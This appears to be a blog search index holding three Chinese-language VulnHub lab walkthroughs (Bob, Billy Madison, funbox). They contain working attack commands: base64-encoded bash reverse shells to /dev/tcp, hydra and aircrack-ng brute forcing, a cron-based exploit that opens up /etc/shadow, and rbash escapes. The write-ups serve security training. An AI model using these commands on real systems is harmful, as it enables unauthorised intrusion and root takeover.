<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>vulnhub-wp Bob 1.0.1</title>
    <link href="/vulnhub-wp-Bob-1-0-1/"/>
    <url>/vulnhub-wp-Bob-1-0-1/</url>
    
    <content type="html"><![CDATA[<h1 id="🖳-主机发现"><a href="#🖳-主机发现" class="headerlink" title="🖳 主机发现"></a>🖳 主机发现</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -r 192.168.234.0/24<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a5481d6693dcb9790d551.png"><br>目标机器是:<strong>192.168.234.47</strong></p><h1 id="👁-服务扫描"><a href="#👁-服务扫描" class="headerlink" title="👁 服务扫描"></a>👁 服务扫描</h1><p>nmap常规扫描端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ sudo nmap -p- -sV 192.168.234.47 --min-rate 10000<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-04 15:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> bogon (192.168.234.47)<br>Host is up (0.000077s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT      STATE SERVICE VERSION<br>80/tcp    open  http    Apache httpd 2.4.25 ((Debian))<br>25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)<br>MAC Address: 08:00:27:C0:CC:74 (Oracle VirtualBox virtual NIC)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.69 seconds<br></code></pre></td></tr></table></figure><p>查看web页面，发现只是一个静态页面，查看源码也没有什么其他信息，然后在robots.txt中找到了一些信息<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f50e44fcfb0ee2323690d.png"><br>一个个访问，发现dev_shell是一个简单的webshell，可以远程执行我们的命令，但是过滤了一些关键字，可以试试base64绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(rightevil㉿kali)-[~/Desktop]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.234.130/1234 0&gt;&amp;1&quot;</span> | <span class="hljs-built_in">base64</span>   <br>L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjM0LjEzMC8xMjM0IDA+JjEK<br>                                                                                                    <br>┌──(rightevil㉿kali)-[~/Desktop]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjM0LjEzMC8xMjM0IDA+JjEK&quot;</span> | <span class="hljs-built_in">base64</span> -d | bash<br></code></pre></td></tr></table></figure><p>将第二条命令复制去webshell执行，同时在本地启动监听</p><h1 id="🚪🚶-获取权限"><a href="#🚪🚶-获取权限" class="headerlink" title="🚪🚶 获取权限"></a>🚪🚶 获取权限</h1><p>成功反弹到一个shell，我们可以用python尝试一下扩展一个交互性高一些的shell（如果有python的话）</p><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/682c80c1209b9225cff43.png"></p><p>通过查找，我们找到了一个密码文件以及一个gpg加密的文件<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1fe839cc4c416c8bfcdba.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/aee07719a02513829fede.png"><br>在Secret目录下，有一个可以运行的脚本，我们可以用他的首字母来组成一个密码<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/3167f62e2e59daaded6df.png"><br>(根据之前web的一个页面来看)<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9641f18628635ddff83c3.png"><br>但是我们无法用www-data去解密这个文件，我们用ssh登上其他用户，然后去解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">seb@Milburg-High:/home/bob/Documents$ gpg -d login.txt.gpg<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/6b8fba82a03a28289357c.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/3d2a135613b833a2aa586.png"></p><h1 id="🛡️-提升权限"><a href="#🛡️-提升权限" class="headerlink" title="🛡️ 提升权限"></a>🛡️ 提升权限</h1><p>然后我们登上bob</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">seb@Milburg-High:/home/bob/Documents$ su bob<br>Password: <br>bob@Milburg-High:~/Documents$ sudo -l<br>sudo: unable to resolve host Milburg-High<br>[sudo] password <span class="hljs-keyword">for</span> bob: <br>Matching Defaults entries <span class="hljs-keyword">for</span> bob on Milburg-High:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User bob may run the following commands on Milburg-High:<br>    (ALL : ALL) ALL<br>bob@Milburg-High:~/Documents$ <span class="hljs-built_in">id</span><br>uid=1001(bob) gid=1001(bob) <span class="hljs-built_in">groups</span>=1001(bob),27(sudo)<br></code></pre></td></tr></table></figure><p>发现有很大的sudo权限，我们直接用sudo提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">bob@Milburg-High:~/Documents$ sudo bash<br>sudo: unable to resolve host Milburg-High<br>root@Milburg-High:/home/bob/Documents<span class="hljs-comment"># whoami</span><br>root<br>root@Milburg-High:/home/bob/Documents<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@Milburg-High:/home/bob/Documents<span class="hljs-comment"># cd /</span><br>root@Milburg-High:/<span class="hljs-comment"># cat flag.txt </span><br>CONGRATS ON GAINING ROOT<br>        .-.<br>       (   )<br>        |~|       _.--._<br>        |~|~:<span class="hljs-string">&#x27;--~&#x27;</span>      |<br>        | | :   <span class="hljs-comment">#root   |</span><br>        | | :     _.--._|<br>        |~|~`<span class="hljs-string">&#x27;--~&#x27;</span><br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>   _____|_|_________ Thanks <span class="hljs-keyword">for</span> playing ~c0rruptedb1t<br>root@Milburg-High:/<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h1 id="📖-推荐文章"><a href="#📖-推荐文章" class="headerlink" title="📖 推荐文章"></a>📖 推荐文章</h1><p><a href="https://www.vulnhub.com/entry/bob-101,226/">Bob 1.0.1下载</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp Billy Madison</title>
    <link href="/vulnhub-wp-Billy-Madison/"/>
    <url>/vulnhub-wp-Billy-Madison/</url>
    
    <content type="html"><![CDATA[<h1 id="🖳-主机发现"><a href="#🖳-主机发现" class="headerlink" title="🖳 主机发现"></a>🖳 主机发现</h1><p>熟悉的netdiscover -r</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">─$ sudo netdiscover -r 192.168.234.0/24<br> Currently scanning: Finished!   |   Screen View: Unique Hosts                                <br> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                   <br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.234.45  00:0c:29:1f:87:52      1      60  VMware, Inc.                                    <br> 192.168.234.196 20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                 <br> 192.168.234.177 c6:62:32:b7:68:66      1      60  Unknown vendor  <br></code></pre></td></tr></table></figure><p>目标机器是<strong>192.168.134.45</strong></p><h1 id="👁-服务扫描"><a href="#👁-服务扫描" class="headerlink" title="👁 服务扫描"></a>👁 服务扫描</h1><p>使用nmap对其进行扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- 192.168.234.45 --min-rate 8000 <br></code></pre></td></tr></table></figure><ul><li>–min-rate 设置最小发包速度为8000，在靶场环境可以快速扫描出结果<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/c84b44e68c831d5bb6b28.png"></p></blockquote></li></ul><h1 id="🚪🚶-获取权限"><a href="#🚪🚶-获取权限" class="headerlink" title="🚪🚶 获取权限"></a>🚪🚶 获取权限</h1><p>一个个探测，经过尝试，smb服务中有一个txt文件，里面提示我们eric的后门以及关闭了。</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/41c0b0d2d7080a15873d5.png"></p></blockquote><p>23端口用telnet连接后，给了我们一个提示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet 192.168.234.45 23<br>***** HAHAH! You<span class="hljs-string">&#x27;re banned for a while, Billy Boy!</span><br><span class="hljs-string">By the way, I caught you trying to hack my wifi - but the joke&#x27;</span>s on you!<br>I don<span class="hljs-string">&#x27;t use ROTten passwords like rkfpuzrahngvat anymore!</span><br><span class="hljs-string">Madison Hotels is as good as MINE!!!! *****</span><br></code></pre></td></tr></table></figure><p>这里给了一个rot13加密的一个字符串</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/997d24edcb9e3cfef5ae6.png"></p></blockquote><p>经过尝试后，这个解密后的字符串是一个web页面的路径<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/5243bfc663b470d9c8a89.png"><br>从这个页面我们可以得到的信息有：</p><ul><li>veronica使用她的名字作为密码</li><li>有一个流量文件在这个路径下，也使用的和veronica相关的名字</li></ul><p>那我们先得到一个关于veronica的字典</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep veronica &gt; pass.txt<br></code></pre></td></tr></table></figure><p>使用dirbuster进行爆破</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4b9c05d1b0f0b5aa6a888.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/45f9abdf33ba98f49b30b.png"></p></blockquote><p>从这个流量文件中，我们可以分析出俩个重要信息</p><ul><li>eric在机器上有一个ftp账号</li><li>该机器的ftp使用了knock服务，需要以一个特定序列进行”敲门”后才会开放</li></ul><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/bc03ac5169c435d246ee1.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1e959b7602674464eb0eb.png"><br>注：<a href="https://www.cnblogs.com/f-carey/p/16066178.html"><em>knock服务科普</em></a><br>无需多言，我们敲门<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b2ff23ee2f283b123522e.png"><br>注：<strong>若是登录ftp的时候报错有关passive的话先输入<code>passive</code>命令进入passive mode</strong></p><p>登录上ftp服务器后，在eric的目录下找到一个.note文件，里面记载了一个后门的打开方法，以及eric的ssh密码在veronica或者billy的目录下。我们爆破一下veronica的ftp试试<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/6f4ea2dfef3d76ccca876.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l veronica -P pass.txt 192.168.234.45 ftp<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a8e6e8d7b87302c45e098.png"><br>登录上veronica后，我们可以找到一个eml文件和一个cap流量文件，把他下载下来分析一下后发现流量是wifi流量，邮件中也提到了这一点。而wifi的密码就是eric的ssh密码<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b33e1302ba9bb532d6706.png"><br>那我们用aircrack-ng爆破一下wifi密码试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aircrack-ng eg-01.cap -w /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1e955d89673ed3fb7af75.png"><br>在爆破的同时，我们也发送一下邮件，激活后门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet 192.168.234.45 2525<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/01df918eb7c3f46a0f9b2.png"><br>现在我们再进行一个nmap扫描，查看是否有新的服务开启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- -sV 192.168.234.45 --min-rate 10000<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ca57562e6a420ca63a14f.png"><br>我们可以使用<strong>eric:triscuit*</strong> 去ssh连接</p><h1 id="🛡️-提升权限"><a href="#🛡️-提升权限" class="headerlink" title="🛡️ 提升权限"></a>🛡️ 提升权限</h1><p>我们在本地开启python的web服务，然后在靶机上用wget下载辅助提权脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali:<br>python3 -m http.server 80<br><br>eric@BM:/tmp$ wget http://192.168.234.130/linpeas.sh<br>--2023-12-03 06:56:14--  http://192.168.234.130/linpeas.sh<br>Connecting to 192.168.234.130:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 847815 (828K) [text/x-sh]<br>Saving to: ‘linpeas.sh’<br><br>linpeas.sh               100%[==================================&gt;] 827.94K  --.-KB/s    <span class="hljs-keyword">in</span> 0.01s   <br><br>2023-12-03 06:56:14 (56.4 MB/s) - ‘linpeas.sh’ saved [847815/847815]<br><br>eric@BM:/tmp$ <span class="hljs-built_in">chmod</span> +x linpeas.sh <br></code></pre></td></tr></table></figure><p>运行脚本之后，我们可以找到一个有趣的文件<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/eaf6f9ff3a060c400420b.png"><br>我们从整个eric的攻击流程可以知道他使用了一个钓鱼的手法让veronica下载了一个恶意文件，我们可以检查一下这个文件的md5值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">eric@BM:/tmp$ <span class="hljs-built_in">md5sum</span> /usr/local/share/sgml/donpcgd<br>cd3621324a40c20e54aad9ecef2f6ed5  /usr/local/share/sgml/donpcgd<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4da69d96a6ee138ed0189.png"><br>我们用google搜索dgcpnod后即可发现这个exploit的利用方法<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a001dcb36c87bcc9eb740.png"><br>而具体的exp如下<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d8d3433d6f3912a577e06.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">eric@BM:/tmp$ <span class="hljs-built_in">touch</span> /tmp/rootme; <span class="hljs-built_in">chmod</span> +x /tmp/rootme; /usr/local/share/sgml/donpcgd /tmp/rootme /etc/cron.hourly/rootme; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;#!/bin/bash \n chmod 777 /etc/shadow&#x27;</span> &gt; /etc/cron.hourly/rootme<br><span class="hljs-comment">#### mknod(/etc/cron.hourly/rootme,81fd,0)</span><br></code></pre></td></tr></table></figure><p>然后我们可以用watch命令监察/etc/shadow</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">watch -n 5 <span class="hljs-string">&quot;ls -la /etc/shadow&quot;</span><br></code></pre></td></tr></table></figure><ul><li><code>-n</code> 指定每次监察间隔<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b056a9c35d4c3ba2ea361.png"><br>这时我们就可以修改shadow文件来提权(稳妥起见可以先对shadow文件进行备份，不管是修改shadow文件还是passwd文件，原理都是一样的)<br>第一步：生成密码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkpasswd -m sha-512 root <br></code></pre></td></tr></table></figure></li><li><code>-m</code> 加密指定模式<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/67e9daaeb42036fedf4f6.png"><br>第二步：将原来的hash值或者x(passwd文件)替换为我们生成的hash值<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/509f5e95160690c1bdcb2.png"><br>至此，提权成功，使用su切换到root用户<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f4f7a281a156d3ae7b58c.png"></li></ul><h1 id="📖-推荐文章"><a href="#📖-推荐文章" class="headerlink" title="📖 推荐文章"></a>📖 推荐文章</h1><p><a href="https://www.vulnhub.com/entry/billy-madison-11,161/">Billy Madison下载</a><br><a href="https://documentation.meraki.com/MX/NAT_and_Port_Forwarding/Active_and_Passive_FTP_Overview_and_Configuration#:~:text=Passive%20FTP%20is%20an%20FTP,the%20connection%20to%20the%20server">ftp的passive模式</a><br><a href="https://www.youtube.com/watch?v=0gQiv_pkOPw">youtube视频 wp</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp funbox:1</title>
    <link href="/vulnhub-wp-funbox1/"/>
    <url>/vulnhub-wp-funbox1/</url>
    
    <content type="html"><![CDATA[<h1 id="🔍-信息收集-Enumeration"><a href="#🔍-信息收集-Enumeration" class="headerlink" title="🔍 信息收集(Enumeration)"></a>🔍 信息收集(Enumeration)</h1><h2 id="🖳-主机发现-Host-Discover"><a href="#🖳-主机发现-Host-Discover" class="headerlink" title="🖳 主机发现(Host Discover)"></a>🖳 主机发现(Host Discover)</h2><p>我们使用netdiscover命令扫描kali的c段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netdiscover -r 192.168.61.0/24  <br></code></pre></td></tr></table></figure><ul><li><code>-r</code> 指定网段<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7e214193ca77ae6d2758c.png"><br>发现目标机是<em>192.168.61.7</em></p></blockquote><h2 id="👁-端口扫描-Port-Scan"><a href="#👁-端口扫描-Port-Scan" class="headerlink" title="👁 端口扫描(Port Scan)"></a>👁 端口扫描(Port Scan)</h2>我们使用nmap进行一个全扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -p- 192.168.61.7 -sV <br></code></pre></td></tr></table></figure></li><li><code>-p-</code> 扫描全端口  (<em>注：这会产生比较大的流量</em>)</li><li><code>-sV</code> 探测端口服务<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e0b912d1bf1022b6b9223.png"><br>得到一个ftp，ssh，http还有一个类似mysql的服务</p></blockquote></li></ul><h2 id="🕵‍♂-服务探测-Service-Detection"><a href="#🕵‍♂-服务探测-Service-Detection" class="headerlink" title="🕵‍♂ 服务探测(Service Detection)"></a>🕵‍♂ 服务探测(Service Detection)</h2><p>我们先从最简单的开始，http，访问目标的80端口。</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/47643d14626051c3c09bd.png"><br>发现被重定向到了一个未知的url，那我们修改hosts文件把这个url绑定到目标ip，然后重新访问</p></blockquote><p>然后发现目标web的cms指纹是wp，那直接上专业工具</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a54e76bbe009bd9abcdd7.png"></p></blockquote><p>我们使用wpscan对目标网站进行扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan -e vp,vt,u --url http://funbox.fritz.box/<br></code></pre></td></tr></table></figure><ul><li><code>-e vp,vt,u</code>指定使用主题漏洞扫描(vt),插件漏洞扫描(vp)，用户扫描(u)</li><li><code>--url</code> 指定扫描目标<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/07382fb560a34d0ec3dd9.png"><br>发现枚举出了俩个用户，可以去登录界面试试弱口令</p></blockquote></li></ul><h1 id="🚪🚶-获取权限-Foothold"><a href="#🚪🚶-获取权限-Foothold" class="headerlink" title="🚪🚶 获取权限(Foothold)"></a>🚪🚶 获取权限(Foothold)</h1><h2 id="💲-ssh获取shell-ssh-get-shell"><a href="#💲-ssh获取shell-ssh-get-shell" class="headerlink" title="💲 ssh获取shell(ssh get shell)"></a>💲 ssh获取shell(ssh get shell)</h2><p>经过尝试，发现用户joe有弱口令<em>12345</em>，那我们可以联想到是否ftp和ssh也有弱口令？<br>直接上hydra(九头蛇)爆破试试，注：<em>在真实渗透测试中，我们应该尽量减少暴力破解的次数，或者应当在收集到了足够的信息再去爆破</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l joe -P top1000.txt -v 192.168.61.7 ssh -t 4<br></code></pre></td></tr></table></figure><ul><li><code>-l</code> 指定用户名</li><li><code>-P</code> 指定密码字典</li><li><code>-v</code> 指定详细信息输出，将会输出爆破进度</li><li><code>ip + 服务名</code></li><li><code>-t</code> 指定线程为4，在ssh爆破时，应使用hydra推荐的线程数4<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/094a4eac27394b27b02b9.png"><br>接下来我们就可以使用弱口令直接ssh登录joe用户</p></blockquote></li></ul><h2 id="🏃-rbash逃逸-rbash-escape"><a href="#🏃-rbash逃逸-rbash-escape" class="headerlink" title="🏃 rbash逃逸(rbash escape)"></a>🏃 rbash逃逸(rbash escape)</h2><p>我们可以发现，获取的是一个rbash，这个时候我们就要进行rbash逃逸。<br>注：<em>这里的pspy64文件是我之前打靶的时候就已经下载了的文件</em></p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/eedad5d0b0978b28b260a.png"></p></blockquote><p>逃逸方法有很多种，我这里就用python来逃逸</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>然后我们先看看mbox是个什么东西(一般自己家目录下都会有点东西提示)</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/56ae90f4639c80ade9244.png"><br>重点解读就是joe用户帮root用户写过一个脚本，还有joe用户将密码设成了12345</p></blockquote><h1 id="🛡️-权限提升-Privilege-Escalation"><a href="#🛡️-权限提升-Privilege-Escalation" class="headerlink" title="🛡️ 权限提升(Privilege Escalation)"></a>🛡️ 权限提升(Privilege Escalation)</h1><p>然后我们就是找这个脚本，后经过一番寻找，我们最终在funny的家目录下发现了backup脚本，还有一个网站的打包文件</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/13fc337e8d37e471ae16c.png"><br>到了这，我们可以猜测这个就是joe用户写的脚本，脚本里面的内容是对/var/www/html目录进行打包。那就很明显了，和网站备份相关的计划任务。</p></blockquote><p>为了验证我们的猜想，我们用pspy工具检测一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64<br><span class="hljs-built_in">chmod</span> +x pspy64<br>./pspy64 -d /home/funny<br></code></pre></td></tr></table></figure><ul><li><code>-d</code> 指定要观察的目录<br>pspy（也称为”pspy64”）是一个用于监视进程活动的工具，特别是在Linux环境中。它允许用户监视正在运行的进程，查看它们的活动和与文件系统的交互，以及与其他进程的通信。pspy是一个轻量级的工具，通常被用于安全审计和故障排除，也可以用于发现潜在的安全问题。<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b7b6b4af3149bae0c0995.png"><br>果然，是发现有一个root的计划任务和funny的计划任务，后面更是发现，root是5分钟执行一次，funny用户是2分钟执行一次</p></blockquote><h2 id="💀-反弹root-shell-reverse-root-shell"><a href="#💀-反弹root-shell-reverse-root-shell" class="headerlink" title="💀 反弹root shell(reverse root shell)"></a>💀 反弹root shell(reverse root shell)</h2>因为我们对backup有修改权限，我们直接在backup脚本中写入反弹shell的语句<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/192.168.61.126/1234 0&gt;&amp;1<br></code></pre></td></tr></table></figure></li><li><code>bash -i</code> 这部分启动Bash shell，并使用-i标志表示要以交互方式运行，这意味着它可以接收用户输入并显示输出</li></ul><ul><li><code>&gt;&amp; /dev/tcp/192.168.61.126/1234</code> 这是一个重定向操作符，将Bash的标准输出和标准错误（1和2）都重定向到指定的IP地址和端口上的网络连接。具体来说，它将输出重定向到/dev/tcp/192.168.61.126/1234。 </li><li><code>0&gt;&amp;1</code> 这也是一个重定向操作符，将标准输入（0）重定向到与标准输出相同的地方，也就是之前重定向到网络连接的位置。</li></ul><p><em>这个命令的作用是将Bash shell的输入和输出连接到IP地址192.168.61.126上的端口1234，这通常用于建立与另一台计算机的反向Shell连接，使远程主机可以控制和执行命令在被攻击的主机上</em><br>这是一个常见的bash反弹shell的语句，然后我们在kali开启nc监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lnvp 1234<br></code></pre></td></tr></table></figure><ul><li><code>-l</code>: 这是netcat的一个选项，用于指示netcat进入监听模式，即等待传入连接。</li><li><code>-n</code>: 这是另一个选项，用于指示netcat不要执行DNS解析，以便更快地处理连接。</li><li><code>-v</code>: 这是一个选项，用于启用详细的输出，通常用于调试目的。</li><li><code>-p</code>: 指定netcat监听的端口号。在这个例子中，它监听端口1234。</li></ul><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/542b7d44ebc8de496e855.png"><br>多次监听后也是成功拿到了root的shell</p></blockquote><h1 id="🐇-兔子洞-rabbit-hole"><a href="#🐇-兔子洞-rabbit-hole" class="headerlink" title="🐇 兔子洞(rabbit hole)"></a>🐇 兔子洞(rabbit hole)</h1><p>一开始我们在wpscan扫描出来的另外一个用户，admin，我们拿到joe的shell后可以去网站目录下看wp的配置文件，然后进入数据库查看用户名和密码</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/cdabd8ccbe42d5dd99a36.png"></p></blockquote><p>接着我们把这个给复制出来，用john去爆破这个hash值</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4bd2db2cd64b31a2b16c6.png"></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john pass.txt 